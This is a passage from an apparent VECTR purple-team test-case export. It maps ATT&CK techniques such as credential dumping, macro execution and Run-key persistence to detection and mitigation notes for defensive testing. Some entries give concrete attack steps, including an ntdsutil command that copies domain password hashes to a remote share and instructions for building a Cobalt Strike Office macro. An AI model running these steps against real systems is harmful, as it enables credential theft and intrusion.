enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)","command":"[APT39](https://attack.mitre.org/groups/G0087) has used stolen credentials to compromise Outlook Web Access (OWA).Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs.\n---\nRoutinely audit source code, application configuration files, open repositories, and public cloud storage for insecure use and storage of credentials.\n---\nCloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting on cloud-based systems along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data.\n---\nAudit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained.\n---\nEnsure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage).\n---\nEnsure users and user groups have appropriate permissions for their roles through Identity and Access Management (IAM) controls. Configure user permissions, groups, and roles for access to cloud-based systems as well. Implement strict IAM controls to prevent access to systems except for the applications, users, and services that require access. Consider using temporary credentials that are only good for a certain period of time in cloud environments to reduce the effectiveness of compromised accounts.\n---\nApplications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured. Ensure that local administrator accounts have complex, unique passwords across all systems on the network.\n\nIn cloud environments, consider rotating access keys within a certain number of days for reducing the effectiveness of stolen credentials.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81","relationship--ea230e17-d23a-4a11-b2f9-358eeeea4ea3","relationship--33e04e78-4d99-49f1-8b10-39b2df7b2419","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--4bc294a7-8b41-481e-8ed0-fa556375cb6b","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--e38d51a7-a4bc-4489-84c6-703f5d174816","course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d","relationship--89887815-acfc-42f9-9172-81437cf9ff69","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--c8acdf40-8237-487f-8255-91afa327705d","course-of-action--25dc1ce8-eb55-4333-ae30-a7cb4f5894a1","relationship--3c3f26b3-d676-4e17-adca-2a8ea4643148","course-of-action--d45f03a8-790a-4f90-b956-cd7e5b8886bf","relationship--aa6cd875-0e05-4a6c-a249-27c708d50bf4","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--4f24d075-4d6c-49d2-a213-306e4af2083d","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn535501.aspx","Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn487457.aspx","Microsoft. (2016, April 16). Implementing Least-Privilege Administrative Models. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn487450.aspx","Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019. https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","undefined. (n.d.). Retrieved April 12, 2019. https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh","undefined. (n.d.). Risks of Default Passwords on the Internet. Retrieved April 12, 2019. https://www.us-cert.gov/ncas/alerts/TA13-175A"],"mitreId":"T1078"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","This mitigation describes any guidance or training given to developers of applications to avoid introducing security weaknesses that an adversary may be able to take advantage of.","Take measures to detect or prevent techniques such as [Credential Dumping](https://attack.mitre.org/techniques/T1003) or installation of keyloggers to acquire credentials through [Input Capture](https://attack.mitre.org/techniques/T1056). Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. \n\nFollow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access) \n\nAudit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Least Privilege) These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. \n\nApplications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. (Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet) When possible, applications that use SSH keys should be updated periodically and properly secured. ","Manage the creation, modification, use, and permissions associated to user accounts.","Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--ed0d3159-8b00-46b2-b0f6-d91cd001e085","vectrId":"ed0d3159-8b00-46b2-b0f6-d91cd001e085","name":"","offset":0,"createTime":1.578424725643E12,"updateTime":1.578425453682E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"ed0d3159-8b00-46b2-b0f6-d91cd001e085","icon":"icons/microsoft-word.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Client-side Execution","variant":"Cobalt Strike Standard Macro - Execution","objective":"Execute malicious Office document on the endpoint","command":"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)\n\nPut macro in office document\n\nExecute the office document on endpoint","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["1) Macro execution is blocked by GPO policy, EDR or endpoint protection tool"],"expectedDetectionLayerIds":["9309d503-0861-4923-8a9a-f4749113e9e7","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Document payload execution is detected by EDR or endpoint protection tool"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--eed6c25f-bbfd-455f-a193-85e4619fa43c","vectrId":"eed6c25f-bbfd-455f-a193-85e4619fa43c","name":"","offset":0,"createTime":1.534359421461E12,"updateTime":1.551994344244E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"eed6c25f-bbfd-455f-a193-85e4619fa43c","icon":"icons/terminal-black-alt-2.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scripting","variant":"Process Creation Using VBS","objective":"Spawn a new process using VBS.","command":"cscript <path to vbs file>","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["96ebaac5-a28f-7b75-4044-bc18a4faa93e"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":null,"mitreId":"T1064"},"blueTeam":{"successfulDetectionBehaviors":["1) Suspicious process execution is blocked by EDR or other endpoint security tool"],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--eedb847b-5fdf-47e6-bc71-ab3998c51a9d","vectrId":"eedb847b-5fdf-47e6-bc71-ab3998c51a9d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"eedb847b-5fdf-47e6-bc71-ab3998c51a9d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Code Signing","variant":"CopyKittens - Code Signing","objective":"Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.","command":"[CopyKittens](https://attack.mitre.org/groups/G0052) digitally signed an executable with a stolen certificate from legitimate company AI Squared.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d","relationship--f6915cfa-4c11-4830-bcd8-aa648596b895","relationship--f9ca3697-51a1-494b-8a61-06e516f29860","course-of-action--82fbc58b-171d-4a2d-9a20-c6b2a716bd08","intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]}],"references":["ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017. http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf","Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016. https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/","Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016. http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates","Thomas. (2013, July 15). New signed malware called Janicab. Retrieved July 17, 2017. http://www.thesafemac.com/new-signed-malware-called-janicab/","Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016. https://en.wikipedia.org/wiki/Code_signing"],"mitreId":"T1116"},"blueTeam":{"successfulDetectionBehaviors":["Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system. (Citation: NSA MS AppLocker) (Citation: TechNet Trusted Publishers) (Citation: Securelist Digital Certificates)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--f22c6ed0-766e-48b0-a373-51e5e640a2b3","vectrId":"f22c6ed0-766e-48b0-a373-51e5e640a2b3","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"f22c6ed0-766e-48b0-a373-51e5e640a2b3","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote File Copy","variant":"MuddyWater - Remote File Copy","objective":"Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that can upload additional files to the victim’s machine.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add","relationship--82d8c106-c216-4d3f-9028-5f0b975e6330","relationship--1ddae833-8280-4afa-b2b0-e250e22104fe","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ab637576-5bf9-423f-b5e8-6d1ac26bbb5c","course-of-action--cdecc44a-1dbf-4c1f-881c-f21e3f47272a","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/"],"mitreId":"T1105"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--f588b7aa-62c0-403a-8c37-3fd419a7c557","vectrId":"f588b7aa-62c0-403a-8c37-3fd419a7c557","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"f588b7aa-62c0-403a-8c37-3fd419a7c557","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing via Service","variant":"OilRig - Spearphishing via Service","objective":"Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used LinkedIn to send spearphishing links. Anti-virus can also automatically quarantine suspicious files.\n---\nUsers can be trained to identify social engineering techniques and spearphishing emails with malicious links.\n---\nDetermine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847","relationship--b3d6abc5-11da-4d0c-a699-8cafac03dfab","relationship--a408e9fc-44fb-4563-a86f-2eb17ff0832d","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","relationship--f1883831-ea71-4e27-ab6a-aa10a7fd7df4","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--0da51973-98f8-4a5e-8217-da19f7bc64b6","course-of-action--c861bcb1-946f-450d-ab75-d4e3c1103a56","relationship--b5c8909c-3fe2-4dbf-bf8a-c620ddfe2bed","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html"],"mitreId":"T1194"},"blueTeam":{"successfulDetectionBehaviors":["Use signatures or heuristics to detect malicious software.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Determine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.\n\nBecause this technique involves use of legitimate services and user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. To prevent the downloads from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--f8712bc6-dde5-41ba-bb98-e7940ef7f061","vectrId":"f8712bc6-dde5-41ba-bb98-e7940ef7f061","name":"New","offset":0,"createTime":1.471180506E12,"updateTime":1.5784260093E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"f8712bc6-dde5-41ba-bb98-e7940ef7f061","icon":"icons/database.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"Extract Password Hashes via NTDSUtil","objective":"Dump domain hashes for all domain users on the domain controller via NTDSUtils. Relies on Volume Shadow Services","command":"ntdsutil “ac in ntds” “ifm” “cr fu \\\\yourip\\tmp” q q","likelihood":"Medium","risk":"High","internalExternal":"Internal","stealth":"Medium","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["96ebaac5-a28f-7b75-4044-bc18a4faa93e"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["1) EDR rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands",""],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit","2) SIEM rules are configured to alert on anomalous logons to DCs from domain admin users and service accounts"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--fd640821-285c-4a9f-9e33-57ed2411beb1","vectrId":"fd640821-285c-4a9f-9e33-57ed2411beb1","name":"New","offset":0,"createTime":1.509151641625E12,"updateTime":1.548612242157E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"fd640821-285c-4a9f-9e33-57ed2411beb1","icon":"icons/laptop-2.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Registry Modification","variant":"Use of common Run keys to maintain persistence using .BAT file","objective":"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.","command":"","likelihood":"Medium","risk":"High","internalExternal":"Internal","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["96ebaac5-a28f-7b75-4044-bc18a4faa93e"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1060"},"blueTeam":{"successfulDetectionBehaviors":["1) Run key manipulation is blocked by endpoint protection or privilege management/application control tools"],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) EDR and/or SIEM rules are configured to detect Windows registry modifications"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--fdba11cd-2055-4a54-b44b-d7b0a5b36965","vectrId":"fdba11cd-2055-4a54-b44b-d7b0a5b36965","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"fdba11cd-2055-4a54-b44b-d7b0a5b36965","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scripting","variant":"OilRig - Scripting","objective":"Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used various types of scripting for execution, including .bat and .vbs scripts. The group has also used macros to deliver malware such as [QUADAGENT](https://attack.mitre.org/software/S0269) and [OopsIE](https://attack.mitre.org/software/S0264).Configure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. Other types of virtualization and application microsegmentation may also mitigate the impact of compromise.\n---\nTurn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44","relationship--e8ce10b4-3b00-40c1-983a-1d87ff9a68ee","relationship--11767ed3-e938-4d0f-97dd-2a190e55f8db","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","relationship--ef3d56d7-2339-4ee7-9086-293d04230fd4","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--edbef2c6-4005-4fdb-b978-9699a7b2a309","course-of-action--57019a80-8523-46b6-be7d-f763a15a2cc6","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014. https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/","Falcone, R. and Lee, B. (2017, July 27). OilRig Uses ISMDoor Variant; Possibly Linked to Greenbug Threat Group. Retrieved January 8, 2018. https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/","Falcone, R., Wilhoit, K.. (2018, November 16). Analyzing OilRig’s Ops Tempo from Testing to Weaponization to Delivery. Retrieved April 23, 2019. https://unit42.paloaltonetworks.com/unit42-analyzing-oilrigs-ops-tempo-testing-weaponization-delivery/","Felix. (2016, September). Analyzing Malicious Office Documents. Retrieved April 11, 2018. https://www.uperesia.com/analyzing-malicious-office-documents","Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. 